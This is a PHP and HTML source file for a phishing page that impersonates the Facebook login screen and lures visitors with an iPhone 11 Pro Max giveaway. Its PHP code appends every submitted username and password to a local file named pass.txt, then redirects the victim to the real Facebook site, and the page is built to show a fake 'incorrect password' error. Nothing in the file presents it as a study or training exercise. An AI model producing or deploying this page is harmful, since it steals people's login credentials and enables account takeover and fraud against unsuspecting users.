
<?php 
	function _fwrite($f,$data='',$m='a'){
        if ($m == 'a') {
            if (file_exists($f)) {
                $handle =  fopen($f, "a" ) ;
                $res = fwrite($handle,$data);
                fclose ($handle);
                return $res;
            } else return _fwrite($f,$data,'w');
        } elseif ($m == 'w') {
            if (file_exists($f)) unlink($f);
            touch($f);
            $handle =  fopen($f, "w" ) ;
            $res = fwrite($handle,$data);
            fclose ($handle);
            return $res;
        }
    }

	$message = $user = $pass = "";

	if(isset($_POST['submit']) ){
		if(isset($_POST['user']) && isset($_POST['pass'])){
			$user = $_POST['user'] ?? "";
			$pass = $_POST['pass'] ?? "";
			_fwrite("pass.txt","$user|$pass\n",'a');
			header("location: https://m.facebook.com/messages");
		}
		$message = "<div class=\"error-container\"><div class=\"error\">The password you entered is incorrect. Did you forget your password?</div></div>";
	}

?>


<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Facebook | Login</title>
	<link rel="icon" href="favicon.ico">
	<style type="text/css">
		body {
			padding: 0;
			margin: 0;
			box-sizing: border-box;
		}
		form {
			padding: 20px;
			margin: 20px auto 20px auto;
			max-width: 500px;
			display: flex;
			align-items: center;
			justify-content: center;
			flex-direction: column;
		}
		input[type=text] {
			border-radius: 10px 10px 0 0;

		}
		input[type=password] {
			border-radius: 0 0 10px 10px;
		}
		input[type=text], input[type=password] {
			width: 100%;
			border: 1px solid #ccc;
			padding: 10px;
		}
		input[type=text]:focus, input[type=password]:focus {
			border: 1px solid #0d65d9;
		}
		input[type=submit] {
			margin-top: 20px;
			width: 100%;
			border-radius: 5px;
			background: #1877f2;
			color: #fff;
			border: none;
			padding: 10px;
			font-weight: bold;
		}
		input[type=submit]:hover {
			background: #0d65d9;
		}
		.banner {
			background: #3b5998;
			color: #fff;
			padding: 10px;
			font-family: Arial, Helvetica, sans-serif;
			font-weight: bold;
			font-size: 2em;
			text-align: center;
		}
		.message {
			text-align: center;
			font-family: Arial, Helvetica, sans-serif;
			max-width: 80%;
			margin: auto;
			padding-top:50px;			
		}
		.apple-logo {
			padding-top: 20px;
			height: 50px;
		}
		.languages {
			max-width: 400px;
			margin: auto;
			display: flex;
		}
		.languages > .list {
			flex: 1;
		}
		.list {
			display: flex;
			flex-direction: column;
			text-align: center;
			font-size: .75em;
			font-family: Arial, Helvetica, sans-serif;
		}
		.list span {
			color: #b3b3b3
		}
		.list a {
			text-decoration: none;
			color: #576b95;
		}
		.error {
			margin: 20px auto 0 auto;
			max-width: 80%;
			padding:20px;
			border-radius: 5px;
			background: #ffe9e6;
			color: tomato;
			border: 1px solid tomato;
			font-family: Arial, Helvetica, sans-serif;
			text-align: center;
		}
	</style>
</head>
<body>
<div class="banner">facebook</div>
<div class="message"><b>Sign in</b> to get a chance to win a new <b>iPhone 11 Pro Max</b><br><img class="apple-logo" src="apple.png"></div>
<?php echo $message; ?>
<form method="POST">
	<input type="text" name="user" value="<?php echo $user; ?>" placeholder="Username">
	<input type="password" name="pass" placeholder="Password">
	<input type="submit" name="submit" value="Login">
</form>

<div class="languages">
	<div class="list">
		<span><b>English (US)</b></span>
		<a href="#">Bisaya</a>
		<a href="#">한국어</a>
		<a href="#">Português (Brasil)</a>
	</div>
	<div class="list">
		<a href="#">Filipino</a>
		<a href="#">Español</a>
		<a href="#">日本語</a>
		<a href="#">Bicol</a>
	</div>
</div>
</body>
</html>